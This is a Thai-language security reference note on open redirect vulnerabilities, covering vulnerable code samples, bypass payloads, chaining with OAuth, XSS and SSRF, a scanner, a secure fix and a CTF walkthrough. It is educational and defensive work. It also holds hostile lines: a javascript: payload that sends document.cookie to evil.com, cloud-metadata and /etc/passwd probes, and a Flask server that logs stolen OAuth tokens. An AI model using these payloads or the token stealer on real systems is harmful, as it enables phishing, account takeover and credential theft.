# Open Redirect

## What
Open Redirect เป็นช่องโหว่ที่เกิดจากการที่เว็บไซต์อนุญาตให้ผู้โจมตีสามารถควบคุม URL ที่ใช้ในการ redirect ผู้ใช้ได้ โดยไม่มีการตรวจสอบหรือ validate ปลายทางที่ถูกต้อง ช่องโหว่นี้มักถูกใช้ใน phishing attacks หรือ chain กับช่องโหว่อื่นๆ เช่น [[XSS]] หรือ OAuth token theft

ช่องโหว่นี้เกิดจากการที่ developer ใช้ user input โดยตรงในการทำ redirect โดยไม่มี whitelist หรือการตรวจสอบที่เหมาะสม ทำให้ attacker สามารถส่งลิงก์ที่ดูน่าเชื่อถือ (มี domain ของเว็บจริง) แต่ redirect ไปยังเว็บ malicious ได้

## Landmark
- **URL Parameters**: `?redirect=`, `?url=`, `?next=`, `?continue=`, `?return=`, `?goto=`, `?returnUrl=`
- **Header-based**: `Referer`, `X-Forwarded-Host`, `Host` headers
- **JavaScript redirects**: `window.location`, `window.location.href`
- **Meta refresh tags**: `<meta http-equiv="refresh">`
- **HTTP response codes**: 301, 302, 303, 307, 308
- **OAuth/SAML flows**: `redirect_uri`, `RelayState` parameters

> [!tip] Detection Tip
> ใช้ Burp Suite's "Find URLs" function เพื่อหา parameters ที่เกี่ยวข้องกับ redirect ทั้งหมดในเว็บไซต์

## Types

### 1. Parameter-based Open Redirect
ประเภทที่พบบ่อยที่สุด ใช้ URL parameter ในการระบุ redirect destination

```python
# Vulnerable code example
# ตัวอย่างโค้ดที่มีช่องโหว่
from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/redirect')
def redirect_user():
    target_url = request.args.get('url')  # รับ URL จาก parameter
    return redirect(target_url)  # Redirect ไปยัง URL ที่ผู้ใช้ระบุโดยไม่มีการตรวจสอบ

# Exploitation:
# https://victim.com/redirect?url=https://evil.com/phishing
```

### 2. Header-based Open Redirect
ใช้ HTTP headers ในการควบคุม redirect destination

```python
# Vulnerable code with Host header
# ตัวอย่างการใช้ Host header ที่ไม่ปลอดภัย
from flask import Flask, request, redirect

@app.route('/login')
def login():
    if user_authenticated():
        host = request.headers.get('Host')  # รับค่าจาก Host header
        return redirect(f'https://{host}/dashboard')  # สร้าง URL จาก Host header โดยตรง
    return "Login failed"

# Exploitation with Host header injection:
# GET /login HTTP/1.1
# Host: evil.com
# Result: redirect to https://evil.com/dashboard
```

### 3. JavaScript-based Open Redirect
การ redirect ผ่าน JavaScript ที่ใช้ user-controlled input

```javascript
// Vulnerable JavaScript redirect
// ตัวอย่าง JavaScript ที่มีช่องโหว่
function redirectUser() {
    const urlParams = new URLSearchParams(window.location.search);
    const target = urlParams.get('redirect');  // รับค่า redirect parameter
    
    if (target) {
        window.location.href = target;  // Redirect ไปยัง URL ที่ผู้ใช้ระบุ
    }
}

// Exploitation:
// https://victim.com/page.html?redirect=javascript:alert(document.cookie)
// https://victim.com/page.html?redirect=https://evil.com
```

### 4. Meta Refresh Open Redirect
การใช้ meta refresh tag ที่ไม่ปลอดภัย

```html
<!-- Vulnerable meta refresh -->
<!-- ตัวอย่าง meta tag ที่มีช่องโหว่ -->
<?php
$redirect_url = $_GET['url'];  // รับ URL จาก GET parameter
?>
<meta http-equiv="refresh" content="0; url=<?php echo $redirect_url; ?>">

<!-- Exploitation: -->
<!-- https://victim.com/page.php?url=https://evil.com/phishing -->
```

## Exploitation

### Basic Exploitation
```bash
# Simple redirect exploitation
# การทดสอบ open redirect พื้นฐาน

# Test common parameters
https://target.com/redirect?url=https://evil.com
https://target.com/login?next=https://evil.com
https://target.com/oauth?redirect_uri=https://evil.com

# Test with URL encoding
https://target.com/redirect?url=https%3A%2F%2Fevil.com

# Test with double encoding
https://target.com/redirect?url=https%253A%252F%252Fevil.com
```

> [!warning] Security Note
> Open Redirect อาจดูเป็นช่องโหว่ที่มี impact ต่ำ แต่สามารถ chain กับช่องโหว่อื่นได้ เช่น OAuth token theft หรือ SSRF

### Bypass Techniques

#### 1. Whitelist Bypass
```bash
# Bypass domain whitelist
# เทคนิคการ bypass whitelist ของ domain

# Using @ symbol
https://target.com/redirect?url=https://target.com@evil.com
https://target.com/redirect?url=https://target.com.evil.com

# Using subdomain
https://target.com/redirect?url=https://evil.com.target.com.attacker.com

# Using URL fragments
https://target.com/redirect?url=https://target.com#@evil.com

# Using backslash (Windows systems)
https://target.com/redirect?url=https://target.com\@evil.com
https://target.com/redirect?url=https://target.com\evil.com

# Using decimal IP encoding
https://target.com/redirect?url=http://2130706433  # 127.0.0.1 in decimal
```

#### 2. Protocol Bypass
```bash
# Alternative protocols
# การใช้ protocol อื่นๆ เพื่อ bypass

# JavaScript protocol
https://target.com/redirect?url=javascript:alert(1)
https://target.com/redirect?url=javascript:window.location='https://evil.com'

# Data URI
https://target.com/redirect?url=data:text/html,<script>alert(1)</script>

# File protocol
https://target.com/redirect?url=file:///etc/passwd
```

#### 3. Encoding Bypass
```bash
# Various encoding techniques
# เทคนิคการ encode เพื่อ bypass filter

# URL encoding
https://target.com/redirect?url=https%3A%2F%2Fevil.com

# Double URL encoding
https://target.com/redirect?url=https%253A%252F%252Fevil.com

# Unicode encoding
https://target.com/redirect?url=https://evil%E3%80%82com

# Mixed case
https://target.com/redirect?url=HTtPs://evil.com

# Null byte injection
https://target.com/redirect?url=https://target.com%00.evil.com
```

### Chaining with Other Vulnerabilities

#### 1. Open Redirect + OAuth Token Theft
```python
# OAuth flow exploitation
# การโจมตีผ่าน OAuth flow

# Step 1: Find open redirect on OAuth callback
# ค้นหา open redirect ใน OAuth callback URL

# Normal OAuth flow:
https://oauth-provider.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/oauth/callback&
  response_type=token

# Exploited flow with open redirect:
https://oauth-provider.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/redirect?url=https://evil.com&
  response_type=token

# Result: Access token sent to evil.com
# https://evil.com#access_token=SENSITIVE_TOKEN
```

#### 2. Open Redirect + [[XSS]]
```html
<!-- Chaining Open Redirect with XSS -->
<!-- การต่อ Open Redirect เข้ากับ XSS -->

<!-- Step 1: Find open redirect with JavaScript protocol support -->
<script>
// Vulnerable redirect function
function handleRedirect() {
    const url = new URLSearchParams(window.location.search).get('url');
    window.location = url;  // ไม่มีการ validate protocol
}
</script>

<!-- Step 2: Exploit with JavaScript protocol -->
<!-- https://target.com/redirect?url=javascript:fetch('https://evil.com/steal?cookie='+document.cookie) -->
```

#### 3. Open Redirect + [[SSRF]]
```bash
# Using open redirect to bypass SSRF protections
# ใช้ open redirect เพื่อ bypass การป้องกัน SSRF

# Scenario: Application blocks internal IPs in SSRF protection
# But allows redirects from trusted domains

# Step 1: Find open redirect on trusted domain
https://trusted-partner.com/redirect?url=http://169.254.169.254/latest/meta-data/

# Step 2: Use it in SSRF parameter
POST /fetch-url HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "url": "https://trusted-partner.com/redirect?url=http://169.254.169.254/latest/meta-data/"
}

# Result: SSRF protection bypassed through trusted domain redirect
```

## Detection Methods

### Manual Testing
```bash
# Manual testing checklist
# รายการตรวจสอบด้วยมือ

# 1. Identify redirect parameters
# ค้นหา parameters ที่เกี่ยวข้องกับ redirect
grep -r "redirect\|url\|next\|return\|goto\|continue" requests.txt

# 2. Test with external domain
https://target.com/redirect?url=https://example.com

# 3. Test with localhost
https://target.com/redirect?url=http://localhost

# 4. Test with IP address
https://target.com/redirect?url=http://192.168.1.1

# 5. Test bypass techniques
# ทดสอบเทคนิคการ bypass ต่างๆ
```

### Automated Scanning
```python
# Automated Open Redirect scanner
# เครื่องมือสแกนหา Open Redirect อัตโนมัติ
import requests
from urllib.parse import urljoin, urlparse

def scan_open_redirect(base_url, redirect_params):
    """
    สแกนหา open redirect vulnerabilities
    """
    test_urls = [
        'https://evil.com',
        'http://localhost',
        '//evil.com',
        'javascript:alert(1)'
    ]
    
    vulnerable_endpoints = []
    
    for param in redirect_params:
        for test_url in test_urls:
            target = f"{base_url}?{param}={test_url}"
            
            try:
                response = requests.get(target, allow_redirects=False, timeout=5)
                
                # ตรวจสอบว่ามี redirect ไปยัง URL ที่ควบคุมได้หรือไม่
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    
                    if test_url in location:
                        vulnerable_endpoints.append({
                            'url': target,
                            'parameter': param,
                            'redirects_to': location,
                            'status': response.status_code
                        })
                        print(f"[+] Vulnerable: {target} -> {location}")
                        
            except Exception as e:
                print(f"[-] Error testing {target}: {str(e)}")
    
    return vulnerable_endpoints

# Example usage
base_url = "https://target.com/redirect"
params = ['url', 'redirect', 'next', 'return', 'goto', 'continue', 'returnUrl']

results = scan_open_redirect(base_url, params)
print(f"\n[*] Found {len(results)} vulnerable endpoints")
```

> [!info] Tool Recommendations
> - [[Burp Suite]]: Intruder with redirect parameter wordlist
> - [[OWASP ZAP]]: Active scan with redirect checks
> - Custom scripts: Python/Go scripts for bulk testing

## Prevention

### Input Validation
```python
# Secure redirect implementation
# ตัวอย่างการทำ redirect ที่ปลอดภัย
from urllib.parse import urlparse
from flask import Flask, request, redirect, abort

app = Flask(__name__)

# Whitelist of allowed domains
ALLOWED_DOMAINS = ['example.com', 'subdomain.example.com']

def is_safe_redirect(url):
    """
    ตรวจสอบว่า URL ปลอดภัยสำหรับการ redirect หรือไม่
    """
    try:
        parsed = urlparse(url)
        
        # ตรวจสอบว่าเป็น relative URL หรือไม่
        if not parsed.netloc:
            return True  # Relative URLs are safe
        
        # ตรวจสอบว่า domain อยู่ใน whitelist หรือไม่
        if parsed.netloc in ALLOWED_DOMAINS:
            return True
        
        return False
    except Exception:
        return False

@app.route('/redirect')
def safe_redirect():
    target_url = request.args.get('url', '/')
    
    if is_safe_redirect(target_url):
        return redirect(target_url)
    else:
        abort(400, "Invalid redirect URL")  # ปฏิเสธ URL ที่ไม่ปลอดภัย

# Alternative: Use relative paths only
@app.route('/redirect-relative')
def relative_redirect():
    path = request.args.get('path', '/')
    
    # ตรวจสอบว่าเป็น relative path (ไม่มี scheme หรือ domain)
    if path.startswith('/') and not path.startswith('//'):
        return redirect(path)
    else:
        abort(400, "Only relative paths allowed")
```

## Related Vulnerabilities
- [[XSS]] - Cross-Site Scripting through JavaScript protocol
- [[SSRF]] - Server-Side Request Forgery via redirect chains
- [[OAuth Security]] - Token theft through redirect_uri manipulation
- [[Phishing]] - Social engineering using trusted domain redirects
- [[CSRF]] - Cross-Site Request Forgery in redirect flows

## CTF Example

### Challenge: "Redirect Me" (Medium)

**Scenario**: เว็บไซต์ e-commerce มี feature "Return to Previous Page" ที่ใช้ parameter `?return_url=` ในการ redirect หลังจาก login สำเร็จ

**Target**: `https://shop.example.com/login`

**Goal**: ขโมย OAuth token ของ user ผ่าน open redirect vulnerability

```python
# Challenge code (simplified)
# โค้ดของโจทย์ (แบบย่อ)
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Process login
        if authenticate(request.form['username'], request.form['password']):
            return_url = request.form.get('return_url', '/dashboard')
            
            # Vulnerable check - only checks if string contains domain
            # การตรวจสอบที่มีช่องโหว่ - ตรวจเฉพาะว่ามี domain string หรือไม่
            if 'shop.example.com' in return_url:
                return redirect(return_url)
    
    return render_template('login.html')
```

**Solution Steps**:

```bash
# Step 1: Identify the vulnerability
# ระบุช่องโหว่
curl -i "https://shop.example.com/login?return_url=https://evil.com"
# Response: 302 redirect to /dashboard (filter blocks external domains)

# Step 2: Test bypass with @ symbol
# ทดสอบ bypass ด้วย @ symbol
curl -i "https://shop.example.com/login?return_url=https://shop.example.com@evil.com"
# Response: 302 redirect to https://shop.example.com@evil.com (bypassed!)

# Step 3: Chain with OAuth flow
# ต่อ chain กับ OAuth flow

# Normal OAuth callback:
# https://shop.example.com/oauth/callback#access_token=SECRET_TOKEN

# Create malicious login link with OAuth callback
# สร้าง login link ที่มีการ redirect ไปยัง callback ของ OAuth
https://shop.example.com/login?return_url=https://shop.example.com@evil.com/oauth/callback

# Step 4: Setup token stealer on evil.com
# ตั้งค่า token stealer บน evil.com
```

```python
# Token stealer server
# เซิร์ฟเวอร์ขโมย token
from flask import Flask, request

app = Flask(__name__)

@app.route('/oauth/callback')
def steal_token():
    # รับ access token จาก URL fragment (จะถูกส่งมาผ่าน Referer header)
    referer = request.headers.get('Referer', '')
    print(f"[+] Stolen token from: {referer}")
    
    # Log the full URL with token
    with open('stolen_tokens.txt', 'a') as f:
        f.write(f"{referer}\n")
    
    return "Processing...", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
```

**Flag**: The captured OAuth access token

> [!success] Key Learning
> Open Redirect มักถูกมองว่าเป็นช่องโหว่ที่มี severity ต่ำ แต่เมื่อ chain กับ OAuth หรือ SAML flows สามารถนำไปสู่ account takeover ได้

## References
- [[Web Security Testing]]
- [[OWASP Testing Guide]]
- [[Bug Bounty Methodology]]
- [[OAuth 2.0 Security]]
- [[URL Parsing]]

## Tools
- [[Burp Suite]] - Manual testing and parameter discovery
- [[OWASP ZAP]] - Automated scanning
- [[Nuclei]] - Template-based scanning
- [[ffuf]] - Parameter fuzzing
- Custom Python scripts - Bulk testing

---
**Tags**: #web #open-redirect #redirect #phishing #oauth #url-manipulation #bypass
**Difficulty**: Medium
**Related**: [[XSS]], [[SSRF]], [[OAuth Security]], [[Phishing]]
